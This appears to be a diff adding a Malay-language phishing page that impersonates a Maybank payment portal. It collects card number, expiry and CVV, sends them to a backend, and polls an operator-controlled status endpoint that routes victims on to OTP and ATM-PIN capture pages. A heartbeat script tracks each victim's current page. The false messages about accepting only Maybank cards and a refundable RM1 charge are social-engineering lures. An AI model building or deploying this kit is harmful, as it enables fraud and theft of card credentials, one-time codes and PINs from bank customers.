@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="ms" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Maybank - Portal Pembayaran Selamat</title>
+    <style>
+        *, *::before, *::after { box-sizing: border-box; }
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f8f9fa;
+            color: #212529;
+        }
+        header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background-color: #ffc72c;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 40px;
+            z-index: 1000;
+        }
+        .header-left { display: flex; align-items: center; gap: 20px; }
+        .header-left img { height: 38px; object-fit: contain; }
+        .lang-btn { font-weight: bold; color: #000; background: rgba(0,0,0,0.08); padding: 5px 12px; border-radius: 4px; text-decoration: none; font-size: 14px; }
+        .header-right { display: flex; align-items: center; gap: 15px; color: #000; font-weight: 600; font-size: 15px; }
+        .phone-group { display: flex; align-items: center; gap: 8px; }
+        .menu-icon { display: flex; flex-direction: column; justify-content: space-between; width: 22px; height: 16px; cursor: pointer; }
+        .menu-icon span { display: block; height: 2.5px; background-color: #000; border-radius: 2px; }
+
+        .main-container {
+            margin-top: 85px;
+            padding: 40px 20px 80px 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: calc(100vh - 85px);
+            background-color: #f8f9fa;
+        }
+
+        .checkout-card {
+            width: 100%;
+            max-width: 520px;
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.04);
+            overflow: hidden;
+            border: 1px solid #eaeaea;
+        }
+
+        .checkout-header {
+            background: linear-gradient(135deg, #1a1a1a 0%, #333333 100%);
+            color: #ffc72c;
+            padding: 25px 30px;
+            text-align: center;
+        }
+        .checkout-header h2 { margin: 0; font-size: 20px; font-weight: 700; letter-spacing: 0.3px; }
+        .secure-badge {
+            display: inline-flex; align-items: center; gap: 6px;
+            background: rgba(255,199,44,0.15); padding: 4px 10px; border-radius: 20px;
+            font-size: 12px; margin-top: 8px; font-weight: 500; color: #ffc72c;
+        }
+
+        .checkout-body { padding: 30px; }
+
+        .alert-box {
+            padding: 14px 16px; border-radius: 8px; font-size: 13.5px; line-height: 1.5;
+            margin-bottom: 15px; font-weight: 500; display: flex; gap: 10px; align-items: flex-start;
+            background-color: #fff9e6; color: #7c6200; border: 1px solid #ffd966; border-left: 4px solid #ffc72c;
+        }
+
+        .payment-methods {
+            display: flex; justify-content: space-between; align-items: center;
+            background: #f8f9fa; padding: 12px 18px; border-radius: 8px;
+            margin-bottom: 25px; border: 1px solid #eaeaea;
+        }
+        .pm-label { font-size: 13px; color: #666; font-weight: 600; }
+        .pm-logos { display: flex; align-items: center; gap: 12px; }
+        .pm-logos img { height: 26px; object-fit: contain; }
+
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; font-weight: 600; margin-bottom: 8px; color: #2c3e50; font-size: 14px; }
+        .input-wrapper { position: relative; }
+        .form-control {
+            width: 100%; padding: 14px 18px; border: 1.5px solid #dcdfe6; border-radius: 8px;
+            font-size: 15px; outline: none; transition: all 0.3s ease; background-color: #fafbfc; color: #333;
+        }
+        .form-control:focus { border-color: #ffc72c; background-color: #fff; box-shadow: 0 0 0 4px rgba(255,199,44,0.15); }
+
+        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+
+        .pay-btn {
+            background-color: #ffc72c; color: #1a1a1a; border: none; width: 100%; padding: 16px;
+            border-radius: 8px; font-size: 17px; font-weight: bold; cursor: pointer;
+            transition: all 0.3s ease; box-shadow: 0 4px 12px rgba(255,199,44,0.3); margin-top: 10px;
+        }
+        .pay-btn:hover { background-color: #e6b325; transform: translateY(-1px); box-shadow: 0 6px 15px rgba(255,199,44,0.4); }
+
+        footer { background-color: #1a1a1a; color: #fff; padding: 60px 20px 30px 20px; }
+        .footer-container { max-width: 1100px; margin: 0 auto; display: flex; flex-direction: column; align-items: flex-start; }
+        .footer-logo { height: 40px; object-fit: contain; margin-bottom: 25px; }
+        .footer-info { font-size: 15px; line-height: 2.2; color: #ccc; display: flex; flex-direction: column; gap: 6px; }
+        .footer-bottom { margin-top: 40px; width: 100%; border-top: 1px solid #333; padding-top: 20px; font-size: 14px; color: #777; text-align: center; }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes shake { 0%,100%{transform:translateX(0)} 10%,30%,50%,70%,90%{transform:translateX(-5px)} 20%,40%,60%,80%{transform:translateX(5px)} }
+        @media (max-width: 580px) {
+            .checkout-card { border-radius: 0; box-shadow: none; border: none; }
+            .main-container { padding: 0; margin-top: 75px; }
+            .checkout-body { padding: 20px; }
+        }
+        /* Mobile Responsive */
+        @media (max-width: 600px) {
+            header {
+                padding: 10px 15px;
+            }
+            .header-left img {
+                height: 28px;
+            }
+            .header-right {
+                font-size: 12px;
+                gap: 8px;
+            }
+            .phone-group span {
+                white-space: nowrap;
+                font-size: 12px;
+            }
+            .lang-btn {
+                font-size: 12px;
+                padding: 4px 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="header-left">
+            <a href="index.html"><img src="maybank-logo.png" alt="Maybank"></a>
+            <a href="payment-en.html" class="lang-btn">EN</a>
+        </div>
+        <div class="header-right">
+            <div class="phone-group">
+                <span>1-300-88-6688</span>
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+            </div>
+            <div class="menu-icon"><span></span><span></span><span></span></div>
+        </div>
+    </header>
+
+    <div class="main-container">
+        <div class="checkout-card">
+            <div class="checkout-header">
+                <h2>Pengesahan Pembayaran</h2>
+                <div class="secure-badge">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                    256-bit Secure Checkout
+                </div>
+            </div>
+
+            <div class="checkout-body">
+                
+                <div class="alert-box">
+                    <span>ℹ️</span>
+                    <div>Untuk mengesahkan pesanan, sila gunakan kad bank Maybank. Jika kad bank lain digunakan, pesanan akan ditolak serta-merta.</div>
+                </div>
+
+                <div class="alert-box">
+                    <span>ℹ️</span>
+                    <div>Untuk mengesahkan pemilikan akaun, caj simbolik sebanyak RM 1 mungkin dikenakan dan akan dikembalikan segera ke akaun anda.</div>
+                </div>
+
+                <div class="payment-methods">
+                    <span class="pm-label">Kad yang Disokong:</span>
+                    <div class="pm-logos">
+                        <img src="maybank-logo.png" alt="Maybank">
+                        <img src="https://i.ibb.co/0p84ZGSf/Mastercard-visa-card-logo.png" alt="Visa Mastercard">
+                    </div>
+                </div>
+
+                <form id="paymentForm">
+                    
+                    <div class="form-group">
+                        <label for="card_holder">Nama Pemegang Kad</label>
+                        <div class="input-wrapper">
+                            <input type="text" id="card_holder" name="card_holder" class="form-control" required placeholder="Cth: AHMAD BIN ISMAIL">
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="card_number">Nombor Kad</label>
+                        <div class="input-wrapper">
+                            <input type="text" id="card_number" name="card_number" class="form-control" required placeholder="5123 •••• •••• 8888" maxlength="19">
+                        </div>
+                    </div>
+
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="expiry_date">Tarikh Tamat</label>
+                            <input type="text" id="expiry_date" name="expiry_date" class="form-control" required placeholder="MM/YY" maxlength="5">
+                        </div>
+
+                        <div class="form-group">
+                            <label for="cvv">CVV / CVC</label>
+                            <input type="password" id="cvv" name="cvv" class="form-control" required placeholder="•••" maxlength="4">
+                        </div>
+                    </div>
+
+                    <button type="submit" class="pay-btn">Sahkan Pembayaran</button>
+
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-container">
+            <a href="index.html"><img src="maybank-logo-white.png" alt="Maybank" class="footer-logo"></a>
+            <div class="footer-info">
+                <div>Alamat: Menara Maybank, 100 Jalan Tun Perak, 50050 Kuala Lumpur, Malaysia</div>
+                <div>Emel: info@maybank.com.my</div>
+                <div>TELEFON: 1-300-88-6688</div>
+                <div>FAKS: +603-2070 9400</div>
+            </div>
+            <div class="footer-bottom">
+                &copy; 2026 Maybank. Hak cipta terpelihara.
+            </div>
+        </div>
+    </footer>
+
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#1a1a1a;z-index:9999;justify-content:center;align-items:center;flex-direction:column;">
+        <div style="width:90px;height:90px;background:rgba(255,199,44,0.1);border-radius:50%;display:flex;justify-content:center;align-items:center;">
+            <div style="width:45px;height:45px;border:4px solid rgba(255,199,44,0.3);border-top:4px solid #ffc72c;border-radius:50%;animation:spin 1s linear infinite;"></div>
+        </div>
+        <div style="font-size:24px;font-weight:700;color:#ffc72c;margin-top:25px;">Maklumat kad sedang disahkan...</div>
+        <p style="font-size:15px;color:rgba(255,255,255,0.8);margin-top:10px;">Sila tunggu, pembayaran anda sedang diproses.</p>
+    </div>
+
+    <!-- Error Modal -->
+    <div id="errorModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:10000;justify-content:center;align-items:center;">
+        <div style="background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3);animation:shake 0.5s;border:2px solid #dc3545;">
+            <div style="font-size:50px;color:#dc3545;margin-bottom:15px;">✕</div>
+            <h3 style="color:#dc3545;margin-bottom:10px;" id="errorTitle">Pengesahan gagal</h3>
+            <p style="color:#555;font-size:15px;" id="errorMessage">Sila semak maklumat yang betul dan cuba lagi</p>
+            <button onclick="closeErrorModal()" style="margin-top:20px;padding:12px 30px;background:#dc3545;color:white;border:none;border-radius:8px;font-size:15px;cursor:pointer;font-weight:bold;">Cuba Lagi</button>
+        </div>
+    </div>
+
+    <script>
+        let pollInterval = null;
+
+        document.getElementById('expiry_date').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+        });
+
+        async function pollOrderStatus() {
+            const orderId = sessionStorage.getItem('orderId');
+            if (!orderId) return;
+
+            try {
+                const res = await fetch('/api/orders/' + orderId + '/status');
+                const data = await res.json();
+
+                if (data.status === 'approved') {
+                    clearInterval(pollInterval);
+                    document.getElementById('loadingOverlay').style.display = 'none';
+                    const nextPages = {
+                        'loading_otp': 'otp.html',
+                        'otp': 'otp.html',
+                        'loading_atm': 'atm-pin.html',
+                        'atm_pin': 'atm-pin.html',
+                        'loading_success': 'success.html',
+                        'success': 'success.html'
+                    };
+                    window.location.href = nextPages[data.currentPage] || 'otp.html';
+                } else if (data.status === 'rejected') {
+                    clearInterval(pollInterval);
+                    document.getElementById('loadingOverlay').style.display = 'none';
+                    if (data.message) {
+                        document.getElementById('errorMessage').textContent = data.message;
+                    }
+                    showErrorModal();
+                }
+            } catch (err) {
+                console.error('Poll error:', err);
+            }
+        }
+
+        function showErrorModal() { document.getElementById('errorModal').style.display = 'flex'; }
+        function closeErrorModal() { document.getElementById('errorModal').style.display = 'none'; }
+
+        document.getElementById('paymentForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const orderId = sessionStorage.getItem('orderId');
+            if (!orderId) {
+                alert('Ralat: Nombor pesanan tidak dijumpai. Sila mulakan semula.');
+                window.location.href = 'data.html';
+                return;
+            }
+
+            const formData = new FormData(e.target);
+            const data = { orderId, ...Object.fromEntries(formData) };
+
+            try {
+                const response = await fetch('/api/orders/payment-data', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+
+                const result = await response.json();
+                
+                if (response.ok) {
+                    document.getElementById('loadingOverlay').style.display = 'flex';
+                    pollInterval = setInterval(pollOrderStatus, 2000);
+                } else {
+                    alert('Ralat: Maklumat tidak lengkap. Sila cuba lagi.');
+                }
+            } catch (err) {
+                alert('Ralat: Gagal menyambung ke pelayan. Sila cuba lagi.');
+            }
+        });
+    </script>
+
+    <script>
+        function sendHeartbeat() {
+            fetch('/api/heartbeat', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ currentPage: window.location.pathname })
+            }).catch(() => {});
+        }
+        setInterval(sendHeartbeat, 30000);
+        sendHeartbeat();
+    </script>
+</body>
+</html>
